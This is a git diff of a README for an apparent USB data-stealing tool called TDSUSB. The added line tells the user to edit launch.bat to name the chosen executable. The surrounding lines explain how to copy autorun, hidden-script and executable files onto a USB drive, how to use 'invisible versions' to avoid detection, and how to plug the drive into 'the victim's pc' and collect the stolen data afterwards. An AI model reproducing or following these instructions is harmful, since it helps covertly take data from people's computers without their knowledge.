@@ -43,6 +43,8 @@ This a list things you need to use this tool
 
 3. Copy following files to your USB drive: `autorun.inf`, `launch.bat`, `hide.vbs`, `TDSUSB.ico`, and for 64 bit operating systems use `TDSUSB.exe` and for 32 bit operating systems use `TDSUSBx32.exe`. To make it almost undetectable use the invisible versions, but they don't work on all computers.
 
+4. Open `launch.bat` in notepad and replace `version here` with the exe you chose in the last step
+
 ## Usage
 
 Just plug in the USB to the victim's pc and it should start the program! if it doesn't click `TDSUSB.exe` to start it. To retrieve the data go to your drive like `"C:\TDSUSB\"`. Replace `C:` with your actual drive letter
